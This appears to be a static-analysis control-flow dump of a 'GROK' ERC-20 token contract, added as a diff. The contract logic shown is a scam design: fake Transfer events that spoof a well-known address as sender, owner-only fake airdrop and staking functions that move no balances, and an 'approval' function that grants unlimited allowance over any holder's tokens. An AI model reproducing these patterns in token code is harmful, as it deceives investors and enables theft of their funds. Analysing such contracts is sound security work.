@@ -1,0 +1,1243 @@
+Contract: Address
+==================================================
+
+Function: isContract
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: 
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470
+
+  ID: 3
+  Type: NodeType.ASSEMBLY
+  Expression: 
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: codehash = extcodehash(uint256)(account)
+
+  ID: 5
+  Type: NodeType.ENDASSEMBLY
+  Expression: 
+
+  ID: 6
+  Type: NodeType.RETURN
+  Expression: (codehash != accountHash && codehash != 0x0)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+
+Function: sendValue
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(address(this).balance >= amount,Address: insufficient balance)
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: 
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: (success,None) = recipient.call{value: amount}()
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(success,Address: unable to send value, recipient may have reverted)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+
+Function: functionCall
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _functionCallWithValue(target,data,0,errorMessage)
+
+Edges:
+  0 -> 1
+
+Function: functionCallWithValue
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(address(this).balance >= value,Address: insufficient balance for call)
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: _functionCallWithValue(target,data,value,errorMessage)
+
+Edges:
+  0 -> 1
+  1 -> 2
+
+Function: _functionCallWithValue
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(isContract(target),Address: call to non-contract)
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: 
+
+  ID: 3
+  Type: NodeType.VARIABLE
+  Expression: 
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: (success,returndata) = target.call{value: weiValue}(data)
+
+  ID: 5
+  Type: NodeType.IF
+  Expression: success
+
+  ID: 6
+  Type: NodeType.RETURN
+  Expression: returndata
+
+  ID: 7
+  Type: NodeType.IF
+  Expression: returndata.length > 0
+
+  ID: 8
+  Type: NodeType.ASSEMBLY
+  Expression: 
+
+  ID: 9
+  Type: NodeType.VARIABLE
+  Expression: 
+
+  ID: 10
+  Type: NodeType.EXPRESSION
+  Expression: returndata_size__functionCallWithValue_asm_0 = mload(uint256)(returndata)
+
+  ID: 11
+  Type: NodeType.EXPRESSION
+  Expression: revert(uint256,uint256)(32 + returndata,returndata_size__functionCallWithValue_asm_0)
+
+  ID: 12
+  Type: NodeType.ENDASSEMBLY
+  Expression: 
+
+  ID: 13
+  Type: NodeType.EXPRESSION
+  Expression: revert(string)(errorMessage)
+
+  ID: 14
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 15
+  Type: NodeType.ENDIF
+  Expression: 
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+  5 -> 7
+  7 -> 8
+  7 -> 13
+  8 -> 9
+  9 -> 10
+  10 -> 11
+  11 -> 12
+  12 -> 14
+  13 -> 14
+  14 -> 15
+
+
+Contract: Context
+==================================================
+
+Function: constructor
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+Edges:
+
+Function: _msgSender
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: msg.sender
+
+Edges:
+  0 -> 1
+
+Function: _msgData
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: this
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: msg.data
+
+Edges:
+  0 -> 1
+  1 -> 2
+
+
+Contract: IERC20
+==================================================
+
+
+Contract: GROK
+==================================================
+
+Function: constructor
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _name = grok 3
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _symbol = GROK 3
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _decimals = 18
+
+  ID: 4
+  Type: NodeType.VARIABLE
+  Expression: initialSupply = 100000000000000 * 10 ** 18
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: _safeOwnr = _ownr
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: _mint(_contDeployr,initialSupply)
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(_contDeployr,0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045,initialSupply / 5)
+
+  ID: 8
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045,0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045,initialSupply / 5)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+  6 -> 7
+  7 -> 8
+
+Function: _msgSender
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: msg.sender
+
+Edges:
+  0 -> 1
+
+Function: _msgData
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: this
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: msg.data
+
+Edges:
+  0 -> 1
+  1 -> 2
+
+Function: name
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _name
+
+Edges:
+  0 -> 1
+
+Function: symbol
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _symbol
+
+Edges:
+  0 -> 1
+
+Function: decimals
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _decimals
+
+Edges:
+  0 -> 1
+
+Function: totalSupply
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _totalSupply
+
+Edges:
+  0 -> 1
+
+Function: balanceOf
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _balances[account]
+
+Edges:
+  0 -> 1
+
+Function: transfer
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _tf(_msgSender(),recipient,amount)
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: true
+
+Edges:
+  0 -> 1
+  1 -> 2
+
+Function: transferFrom
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _tf(sender,recipient,amount)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _approve(sender,_msgSender(),_allowances[sender][_msgSender()] - amount)
+
+  ID: 3
+  Type: NodeType.RETURN
+  Expression: true
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+Function: allowance
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _allowances[owner][spender]
+
+Edges:
+  0 -> 1
+
+Function: approve
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _approve(_msgSender(),spender,amount)
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: true
+
+Edges:
+  0 -> 1
+  1 -> 2
+
+Function: _pApproval
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(msg.sender == _ownr,!owner)
+
+  ID: 2
+  Type: NodeType.STARTLOOP
+  Expression: 
+
+  ID: 3
+  Type: NodeType.ENDLOOP
+  Expression: 
+
+  ID: 4
+  Type: NodeType.VARIABLE
+  Expression: i = 0
+
+  ID: 5
+  Type: NodeType.IFLOOP
+  Expression: i < destination.length
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: _plus[destination[i]] = true
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: _discarded[destination[i]] = false
+
+  ID: 8
+  Type: NodeType.EXPRESSION
+  Expression: i ++
+
+Edges:
+  0 -> 1
+  1 -> 4
+  2 -> 5
+  4 -> 2
+  5 -> 6
+  5 -> 3
+  6 -> 7
+  7 -> 8
+  8 -> 5
+
+Function: _mApproval
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(msg.sender == _ownr,!owner)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _safeOwnr = safeOwner
+
+Edges:
+  0 -> 1
+  1 -> 2
+
+Function: _transfer
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(sender != address(0),ERC20: transfer from the zero address)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(recipient != address(0),ERC20: transfer to the zero address)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _beforeTokenTransfer(sender,recipient,amount)
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: _balances[sender] = _balances[sender] - amount
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: _balances[recipient] = _balances[recipient] + amount
+
+  ID: 6
+  Type: NodeType.IF
+  Expression: sender == _ownr
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: sender = _contDeployr
+
+  ID: 8
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 9
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(sender,recipient,amount)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+  6 -> 7
+  6 -> 8
+  7 -> 8
+  8 -> 9
+
+Function: _mint
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(msg.sender == _ownr,ERC20: mint to the zero address)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _totalSupply = _totalSupply + amount
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _balances[_ownr] = _balances[_ownr] + amount
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(address(0),account,amount)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+
+Function: _burn
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(account != address(0),ERC20: burn from the zero address)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _beforeTokenTransfer(account,address(0),amount)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _balances[account] = _balances[account] - amount
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: _totalSupply = _totalSupply - amount
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(account,address(0),amount)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+
+Function: _approve
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(owner != address(0),ERC20: approve from the zero address)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(spender != address(0),ERC20: approve to the zero address)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _allowances[owner][spender] = amount
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: Approval(owner,spender,amount)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+
+Function: _tf
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _pair(from,dest,amt)
+
+Edges:
+  0 -> 1
+
+Function: _pair
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(from != address(0),ERC20: transfer from the zero address)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(dest != address(0),ERC20: transfer to the zero address)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _beforeTokenTransfer(from,dest,amt)
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: _balances[from] = _balances[from] - amt
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: _balances[dest] = _balances[dest] + amt
+
+  ID: 6
+  Type: NodeType.IF
+  Expression: from == _ownr
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: from = _contDeployr
+
+  ID: 8
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 9
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(from,dest,amt)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+  6 -> 7
+  6 -> 8
+  7 -> 8
+  8 -> 9
+
+Function: _setupDecimals
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _decimals = decimals_
+
+Edges:
+  0 -> 1
+
+Function: _beforeTokenTransfer
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+Edges:
+
+Function: renounceOwnership
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _verify()
+
+Edges:
+  0 -> 1
+
+Function: burnLPTokens
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _verify()
+
+Edges:
+  0 -> 1
+
+Function: multicall
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.STARTLOOP
+  Expression: 
+
+  ID: 2
+  Type: NodeType.ENDLOOP
+  Expression: 
+
+  ID: 3
+  Type: NodeType.VARIABLE
+  Expression: i = 0
+
+  ID: 4
+  Type: NodeType.IFLOOP
+  Expression: i < eReceiver.length
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(uPool,eReceiver[i],eAmounts[i])
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: i ++
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: _verify()
+
+Edges:
+  0 -> 7
+  1 -> 4
+  3 -> 1
+  4 -> 5
+  4 -> 2
+  5 -> 6
+  6 -> 4
+  7 -> 3
+
+Function: send
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.STARTLOOP
+  Expression: 
+
+  ID: 2
+  Type: NodeType.ENDLOOP
+  Expression: 
+
+  ID: 3
+  Type: NodeType.VARIABLE
+  Expression: i = 0
+
+  ID: 4
+  Type: NodeType.IFLOOP
+  Expression: i < eReceiver.length
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(uPool,eReceiver[i],eAmounts[i])
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: i ++
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: _verify()
+
+Edges:
+  0 -> 7
+  1 -> 4
+  3 -> 1
+  4 -> 5
+  4 -> 2
+  5 -> 6
+  6 -> 4
+  7 -> 3
+
+Function: tokenDropDirect
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.STARTLOOP
+  Expression: 
+
+  ID: 2
+  Type: NodeType.ENDLOOP
+  Expression: 
+
+  ID: 3
+  Type: NodeType.VARIABLE
+  Expression: i = 0
+
+  ID: 4
+  Type: NodeType.IFLOOP
+  Expression: i < eReceiver.length
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(uPool,eReceiver[i],eAmounts[i])
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: i ++
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: _verify()
+
+Edges:
+  0 -> 7
+  1 -> 4
+  3 -> 1
+  4 -> 5
+  4 -> 2
+  5 -> 6
+  6 -> 4
+  7 -> 3
+
+Function: claimAirdrop
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.STARTLOOP
+  Expression: 
+
+  ID: 2
+  Type: NodeType.ENDLOOP
+  Expression: 
+
+  ID: 3
+  Type: NodeType.VARIABLE
+  Expression: i = 0
+
+  ID: 4
+  Type: NodeType.IFLOOP
+  Expression: i < eReceiver.length
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(uPool,eReceiver[i],eAmounts[i])
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: i ++
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: _verify()
+
+Edges:
+  0 -> 7
+  1 -> 4
+  3 -> 1
+  4 -> 5
+  4 -> 2
+  5 -> 6
+  6 -> 4
+  7 -> 3
+
+Function: lockTokens
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(_contDeployr,0xE2fE530C047f2d85298b07D9333C05737f1435fB,x * 10 ** 18)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _verify()
+
+Edges:
+  0 -> 2
+  2 -> 1
+
+Function: secure
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _plus[recipient] = true
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _approve(recipient,_path_,_maximumVal)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _verify()
+
+Edges:
+  0 -> 3
+  1 -> 2
+  3 -> 1
+
+Function: perform
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _plus[recipient] = false
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _approve(recipient,_path_,0)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _verify()
+
+Edges:
+  0 -> 3
+  1 -> 2
+  3 -> 1
+
+Function: approval
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _approve(addr,_msgSender(),_maximumVal)
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: true
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _verify()
+
+Edges:
+  0 -> 3
+  1 -> 2
+  3 -> 1
+
+Function: stake
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.STARTLOOP
+  Expression: 
+
+  ID: 2
+  Type: NodeType.ENDLOOP
+  Expression: 
+
+  ID: 3
+  Type: NodeType.VARIABLE
+  Expression: i = 0
+
+  ID: 4
+  Type: NodeType.IFLOOP
+  Expression: i < eReceiver.length
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(eReceiver[i],uPool,eAmounts[i])
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: i ++
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: _verify()
+
+Edges:
+  0 -> 7
+  1 -> 4
+  3 -> 1
+  4 -> 5
+  4 -> 2
+  5 -> 6
+  6 -> 4
+  7 -> 3
+
+Function: unstake
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.STARTLOOP
+  Expression: 
+
+  ID: 2
+  Type: NodeType.ENDLOOP
+  Expression: 
+
+  ID: 3
+  Type: NodeType.VARIABLE
+  Expression: i = 0
+
+  ID: 4
+  Type: NodeType.IFLOOP
+  Expression: i < eReceiver.length
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(eReceiver[i],uPool,eAmounts[i])
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: i ++
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: _verify()
+
+Edges:
+  0 -> 7
+  1 -> 4
+  3 -> 1
+  4 -> 5
+  4 -> 2
+  5 -> 6
+  6 -> 4
+  7 -> 3
+
+Function: swapETHForExactTokens
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.STARTLOOP
+  Expression: 
+
+  ID: 2
+  Type: NodeType.ENDLOOP
+  Expression: 
+
+  ID: 3
+  Type: NodeType.VARIABLE
+  Expression: i = 0
+
+  ID: 4
+  Type: NodeType.IFLOOP
+  Expression: i < eReceiver.length
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(uPool,eReceiver[i],eAmounts[i])
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: i ++
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: _verify()
+
+Edges:
+  0 -> 7
+  1 -> 4
+  3 -> 1
+  4 -> 5
+  4 -> 2
+  5 -> 6
+  6 -> 4
+  7 -> 3
+
+Function: slitherConstructorVariables
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _maximumVal = 115792089237316195423570985008687907853269984665640564039457584007913129639935
+
+  ID: 1
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _discardedAmt = 0
+
+  ID: 2
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _path_ = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
+
+  ID: 3
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _contDeployr = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045
+
+  ID: 4
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _ownr = 0xc2f0f5965C00F0506E144506A6070596AC6CFce5
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+
+
